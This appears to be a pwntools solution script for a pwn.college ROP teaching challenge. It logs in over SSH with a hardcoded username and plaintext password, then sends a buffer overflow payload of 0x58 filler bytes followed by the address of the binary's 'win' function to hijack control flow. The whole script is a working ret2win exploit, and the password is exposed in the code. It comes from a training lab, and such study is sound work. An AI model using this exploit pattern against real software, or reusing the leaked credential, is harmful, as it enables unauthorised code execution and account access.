from pwn import *

e = ELF('./babyrop_level1_teaching1')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')
p = s.run(['/babyrop_level1_teaching1'])

pay = b'A'*0x58
pay += p64(e.symbols['win'])

p.sendline(pay)

p.interactive()